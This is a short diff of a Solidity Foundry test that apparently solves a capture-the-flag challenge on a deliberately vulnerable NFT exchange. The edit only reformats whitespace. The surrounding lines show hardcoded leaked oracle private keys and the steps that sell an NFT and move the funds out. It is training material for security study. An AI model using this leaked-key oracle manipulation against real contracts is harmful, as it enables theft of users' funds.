@@ -86,7 +86,7 @@ contract CompromisedChallenge is Test {
         0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
         cast wallet address 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8 <- source 2
-        */     
+        */
         uint256 source1PK = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
         uint256 source2PK = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
         address source1Address = vm.addr(source1PK);
@@ -109,7 +109,7 @@ contract CompromisedChallenge is Test {
         vm.startPrank(player);
         nft.approve(address(exchange), 0);
         exchange.sellOne(0);
-        (bool success, ) = address(recovery).call{value:INITIAL_NFT_PRICE}("");
+        (bool success,) = address(recovery).call{value: INITIAL_NFT_PRICE}("");
         require(success, "Transfer to recovery address failed");
         vm.stopPrank();
 
